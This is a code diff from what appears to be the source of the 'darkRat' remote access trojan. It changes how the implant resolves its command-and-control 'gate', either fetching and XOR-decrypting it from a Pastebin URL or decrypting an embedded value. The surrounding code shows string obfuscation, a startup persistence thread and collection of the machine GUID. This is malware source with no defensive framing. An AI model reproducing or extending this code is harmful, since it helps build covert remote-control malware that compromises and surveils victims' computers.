@@ -73,8 +73,18 @@ public:
 		//darkRat::config::config config = darkRat::config::load();
 		std::thread startupPersistence;
 		std::thread runningPlugin;
+		std::string gateFromPatebin;
+		if (config.pastebinUrl.find(OBFUSCATE("http://")) != std::string::npos) {
+			gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", "GET"));
+		}
+		else if (config.pastebinUrl.find(OBFUSCATE("https://")) != std::string::npos) {
+			gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", "GET"));
+		}
+		else {
+			gateFromPatebin = XOR::Decrypt(config.pastebinUrl);
+		}
 		//Fetch Gate from raw Site
-		std::string gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", "GET"));
+	
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
 		std::string finalPost = Client::returnFinalPost(config);
